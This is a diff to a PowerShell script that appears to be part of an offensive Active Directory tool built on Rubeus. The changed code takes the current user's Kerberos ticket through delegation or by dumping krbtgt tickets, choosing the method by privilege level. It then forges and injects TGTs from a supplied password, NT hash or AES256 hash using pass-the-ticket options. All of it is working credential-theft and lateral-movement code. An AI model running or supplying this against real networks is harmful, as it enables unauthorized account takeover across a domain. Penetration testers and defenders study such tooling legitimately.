@@ -507,77 +507,80 @@ function Invoke-Rubeus{
 IF ($GenRelayList){Set-Variable -Name "CurrentUser" -Value $True}
 
 # if the switch "CurrentUser" has not been set to $True then use Rubeus to store the current users ticket
-IF (!$CurrentUser){
-IF ($Method -ne "RDP") {
-    try {
-
-    $Ticket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
-    $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
-}
-
-Catch {
-
-try{
- Write-Host "[*] " -ForegroundColor "Yellow"   -NoNewline
- Write-Host "Ticket retrieval failed. Trying alternative methods"
- 
- IF (!$CheckAdmin){
-
- Write-Host "[*] " -ForegroundColor "Yellow"   -NoNewline
- Write-Host "We are NOT a high integrity shell"
- $Ticket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
- $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
-    
-    }
-
-IF ($CheckAdmin){
- 
- Write-Host "[*] " -ForegroundColor "Yellow"   -NoNewline
- Write-Host "We are in a high integrity shell"
- $Ticket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
- $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (!$CurrentUser) {
+    if ($Method -ne "RDP") {
+        try {
+            $Ticket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
+            $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
         }
-    }
+        Catch {
+            try {
+                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                Write-Host "Current user ticket retreival failed. Trying alternate methods..."
+                Start-Sleep -Seconds 2
+                
+                if (!$CheckAdmin) {
+                    
+                    $Ticket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
+                    $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+                    if ($OriginalUserTicket -notlike "doI*") {
+                        
+                        Write-Host "[-] " -NoNewline -ForegroundColor "Red"
+                        Write-Host "Unable to retrieve any Kerberos tickets"
+                        return
+                    }
 
-Catch {
+                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                    Write-Host "SUCCESS!"
+                }
+                elseif ($CheckAdmin) {
+                    
+                    $Ticket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
+                    $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+                    if ($OriginalUserTicket -notlike "doI*") {
+                        
+                        Write-Host "[-] " -NoNewline
+                        Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
+                        return
+                    }
 
-    Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Yellow"
-    return
+                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                    Write-Host "SUCCESS!"
+                }
+            }
+            Catch {
+                
+                Write-Host "[-] Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
+                return
+            }
+        }
 
-    }
- 
- }
-
-
-    # Check if Password or Hash has been provided
-    # Update module to include a function to error if both values or none have been provided.
-    if ($Password -ne "") {
-        klist purge | Out-Null
-        Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt" | Out-Null
-    }
-
-    elseif ($Hash -ne "") {
-        if ($Hash.Length -eq 32) {
+        # Check if Password or Hash has been provided
+        if ($Password -ne "") {
             klist purge | Out-Null
-            Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt" | Out-Null
+            Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt" | Out-Null
         }
-
-        elseif ($Hash.Length -eq 64) {
-            klist purge | Out-Null
-            Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt" | Out-Null
-        }
-
-        else {
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Invalid hash length "
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Supply either a 32 character RC4 / NT hash or a 64 character AES256 hash"
-        Write-Host
-        break
+        elseif ($Hash -ne "") {
+            if ($Hash.Length -eq 32) {
+                klist purge | Out-Null
+                Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt" | Out-Null
+            }
+            elseif ($Hash.Length -eq 64) {
+                klist purge | Out-Null
+                Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt" | Out-Null
+            }
+            else {
+                Write-Host "[!] Invalid hash length" -ForegroundColor "Yellow" -NoNewline
+                Write-Host "[!] Supply either a 32 character RC4 / NT hash or a 64 character AES256 hash"
+                Write-Host
+                break
             }
         }
     }
 }
+
+
 
 if ($Module -eq "KerbDump"){
     Write-Host "- " -ForegroundColor "Yellow" -NoNewline
